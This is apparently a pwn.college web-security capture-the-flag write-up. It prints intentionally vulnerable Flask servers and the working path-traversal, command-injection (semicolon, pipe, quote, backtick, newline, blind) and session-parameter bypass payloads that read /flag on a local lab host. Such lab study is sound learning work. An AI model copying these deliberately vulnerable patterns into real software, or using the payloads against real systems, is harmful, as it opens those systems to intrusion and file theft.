---
custom_edit_url: null
sidebar_position: 1
---

## Path Traversal 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/data", methods=["GET"])
@app.route("/data/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The challenge looks for the `/data` path in the request and then uses the following `<path:path>` in order to craft the full requested path.

```
## Request:
curl "challenge.localhost:80/data/../../flag"

## Full path:
/challenge + /files/ + flag  -->  /challenge/files/../../flag  -->  /flag
```

Let's perform path traversal to solve this challenge.

```
hacker@web-security~path-traversal-1:/$ curl "challenge.localhost:80/data/..%2F..%2Fflag"
pwn.college{A0_4-6SgR7VQApzuImhC7CrZa4J.ddDOzMDL4ITM0EzW}
```

&nbsp;

## Path Traversal 2

### Source code
```py title="/challenge/server" showlineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/dump", methods=["GET"])
@app.route("/dump/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge strips the `/.` characters from the beginning and the end of the `<path:path>` string.

```
## Request:
curl "challenge.localhost:80/dump/../../flag"

## Stripped:
../../flag  ==>  flag

## Full path:
/challenge/files/flag
```

Fortunately, there is a `fortunes` directory we can use to our advantage.
If we use `fortunes/../../../flag` as our `<path:path>`, the `/.` characters will not be stripped since thay are no longer trailing or leading the string.

```
hacker@web-security~path-traversal-2:/$ ls /challenge/files/
fortunes  index.html
```

```
## Request:
curl "challenge.localhost:80/dump/fortunes/../../../flag"

## Stripped:
fortunes/../../../flag  ==>  fortunes/../../../flag 

## Full path:
/challenge + /files/ + fortunes/../../../flag  ==>  /challenge/files/fortunes/../../../flag  ==>  /flag
```

```
hacker@web-security~path-traversal-2:/$ curl "challenge.localhost:80/dump/fortunes/..%2F..%2F..%2Fflag"
pwn.college{gTCJICEJPu2FAs5FxbMoQ5lh9sz.dJjN1YDL4ITM0EzW}
```

&nbsp;

## CMDi 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/mission", methods=["GET"])
def challenge():
    arg = flask.request.args.get("target", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=target><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The challenge, by default lists the contents of `/challenge`.
We have control over the directory that it lists via the `target` parameter.

```
## Request:
curl "challenge.localhost:80/mission?target=/"

## Resultant command:
ls -l /
```

### Command injection

#### Semicolon (`;`)

If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.

```
## Request:
curl "challenge.localhost:80/mission?target=/; cat /flag"

## Resultant command:
ls -l /;
cat /flag
```

```
hacker@web-security~cmdi-1:/$ curl "challenge.localhost:80/mission?target=/;%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=target><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l /; cat /flag:</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 10 14:53 challenge
drwxr-xr-x    6 root root  380 Jun 10 14:53 dev
drwxr-xr-x    1 root root 4096 Jun 10 14:53 etc
-r--------    1 root root   58 Jun 10 14:53 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2495 root root    0 Jun 10 14:53 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 10 14:53 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 10 14:57 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{gUm2UrsNXxOB3nnxPOrhhcHusWX.dVjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/event", methods=["GET"])
def challenge():
    arg = flask.request.args.get("destination", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/event"><input type=text name=destination><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge replaces our semi-colon `";"` with blank space `""`.

### Command injection

In order to get around this we can use a PIPE (`|`) operator. It causes the output of the first command to be sent to the second as input.

```
## Request:
curl "challenge.localhost:80/event?destination=/ | cat /flag"

## Resultant command:
ls -l / | cat /flag
```

```
hacker@web-security~cmdi-2:/$ curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/event"><input type=text name=destination><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l / | cat /flag:</b><br>
        <pre>pwn.college{obrVvG7pT1vGdbdi4WO7kgKhwY2.dRjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 3

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This time, the user input is inserted between single quotes.
This causes special characters like `;` to be treated like normal strings.

### Command injection

We have to escape the quotes while being careful that we balance out the quotes.

```
## Request:
curl "challenge.localhost:80/quest?path=/'; cat /flag'"

## Resultant commands:
ls -l '/';
cat /flag ''
```

```
hacker@web-security~cmdi-3:/$ curl "challenge.localhost:80/quest?path=/';%20cat%20/flag'"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l '/'; cat /flag'':</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 10 15:54 challenge
drwxr-xr-x    6 root root  380 Jun 10 15:54 dev
drwxr-xr-x    1 root root 4096 Jun 10 15:54 etc
-r--------    1 root root   58 Jun 10 15:54 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2526 root root    0 Jun 10 15:54 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 10 15:54 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 10 15:58 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{I5wi0RanpeaavNfrjzwk2pvGOry.dZjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/exercise", methods=["GET"])
def challenge():
    arg = flask.request.args.get("zone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

As we can see, the server takes the value given to the `zone` parameter.
It then inserts the argument in the shell command to retrieve the date.

```
## Request
curl "http://challenge.localhost:80/exercise?zone=UTC"

## Resultant command
TZ=UTC date
```

From the above command, the shell set the environment variable `TZ` to our provided value and then executes the `date` command in that context.

### Command Injection

#### Backticks 

If we provide the `whoami` command with backticks, the shell executes the command within the backticks first.
Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.

```
## Request:
curl "http://challenge.localhost:80/exercise?zone=`whoami`"

## Resultant command
TZ=`whoami` date  ==>  TZ=root date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)

![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)

```
hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=`whoami`"

        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of TZ=hacker date:</b><br>
        <pre>Tue Jun 10 16:36:19 hacker 2025
</pre>
        </body></html>
```

```
## Request:
url "http://challenge.localhost:80/exercise?zone=; cat /flag;#"

## Resultant commands:
TZ=;
cat /flag;
#date    ## The date command is commented out
```

```
hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;#"

        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of TZ=; cat /flag; date:</b><br>
        <pre>pwn.college{Ysq82cpYvUuY5etm1UCOIotGS6b.dhDOzMDL4ITM0EzW}
</pre>
        </body></html>
```

Even if we don't comment out `date`, it should be okay because it runs with `TZ=MST` by default.

&nbsp;

## CMDi 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/task", methods=["GET"])
def challenge():
    arg = flask.request.args.get("filepath", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This time, tehe output of our injected command is not directly printed.

### Blind command injection

```
Request:
curl "http://challenge.localhost:80/task?filepath=; cat /flag > /home/hacker/flag"

Resultant commands:
touch ;
cat /flag > /home/hacker/flag
```

```
hacker@web-security~cmdi-5:/$ curl "http://challenge.localhost:80/task?filepath=;%20cat%20/flag%20>%20/home/hacker/flag"

        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran touch ; cat /flag > /home/hacker/flag!</b><br>
        </body></html>
```

```
hacker@web-security~cmdi-5:/$ cat ~/flag
pwn.college{8AaACXxDIVRIYtpf0DRFtffjDx6.ddjN1YDL4ITM0EzW}
```

&nbsp;

## CMDi 6

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/adventure", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("directory-path", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge filters out most of the characters used in command injections.

### Command injection
#### New line (`\n`)

If we use a new line character (`\n`), we can work our way around this challenge.

```
## Request:
curl "http://challenge.localhost:80/adventure?directory-path=/\n cat /flag"

## Resultant command:
ls -l /
cat /flag
```

```
hacker@web-security~cmdi-6:/$ curl "http://challenge.localhost:80/adventure?directory-path=/%0A%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l /
 cat /flag:</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 11 03:00 challenge
drwxr-xr-x    6 root root  380 Jun 11 03:00 dev
drwxr-xr-x    1 root root 4096 Jun 11 03:00 etc
-r--------    1 root root   58 Jun 11 03:00 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2327 root root    0 Jun 11 03:00 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 11 03:00 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 11 03:08 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{ICIJmqkqLzC2c3VHciM_lzRSA-S.dRzN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## Authentication Bypass 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge checks if we have provided the correct credentials for the `admin` user.
After successful login, the app redirects with:

```py title="/challenge/server" showLineNumbers
return redirect(f"/?session_user={username}")
```

Then in the GET route, it uses:

```py title="/challenge/server" showLineNumbers
username = request.args.get("session_user")
if username == "admin":
    show_flag()
```

This blindly trusts the user-controlled session_user parameter with no validation.
This insecure session handling causes IDOR.

### IDOR

```
hacker@web-security~authentication-bypass-1:/$ curl "challenge.localhost:80/?session_user=admin"
<html><body>Hello, admin!<br>Here is your flag: pwn.college{gDnBe8GKyI_E8AT1QYRMzHDq2Fy.dlDOzMDL4ITM0EzW}

        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
```

&nbsp;

## Authentication Bypass 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
